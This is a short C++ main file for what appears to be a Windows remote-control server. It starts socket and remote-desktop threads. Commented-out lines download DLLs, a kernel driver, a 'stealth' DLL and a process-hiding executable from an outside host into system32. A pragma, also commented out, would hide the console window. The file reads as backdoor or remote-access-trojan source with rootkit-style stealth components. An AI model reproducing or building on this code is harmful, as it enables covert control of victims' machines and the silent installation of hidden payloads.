#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include <strsafe.h>
#include <fstream>
//#include <Urlmon.h>

#include "MLHT_SERVER.h"
#include "Thread_Socket.h"
#include "Thread_RC.h"

//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
//#pragma comment(lib, "urlmon.lib")
#pragma comment (lib, "Ws2_32.lib")

MLHT_SERVER* ms;  //MLHT 服务器
MLHT_SERVER* ms_rc;  //MLHT 服务器


struct ThreadInfo
{
	int    serial;
	char   entity;
	double delay;
	double persist;
};


void CreateThread(){
	DWORD n_thread = 0;  
	DWORD thread_ID ;	 
 
	HANDLE	h_Thread[2];

	int a = 0;

	h_Thread[0] = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)( Thread_Socket),
	&a,0,&thread_ID);

	h_Thread[1] = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)( Thread_RemoteDesttop),
	&a,0,&thread_ID);

	
  	WaitForMultipleObjects(2,h_Thread,TRUE,-1);
}


int main(){
	//URLDownloadToFile(NULL,"http://13xinan.com/cucyue3/msvcp100d.dll","c:\\windows\\system32\\msvcp100d.dll",0,0);
	//URLDownloadToFile(NULL,"http://13xinan.com/cucyue3/cccc.sys","c:\\windows\\system32\\drivers\\cccc.sys",0,0);
	//URLDownloadToFile(NULL,"http://13xinan.com/cucyue3/stealth2.dll","c:\\windows\\system32\\stealth2.dll",0,0);
	//URLDownloadToFile(NULL,"http://13xinan.com/cucyue3/HideProc2.exe","c:\\HideProc2.exe",0,0);

	//char path[MLHT_MAX_LENGTH] = {0};
	//execmd(path);
	//printf("%s",path);
	CreateThread();
	
}
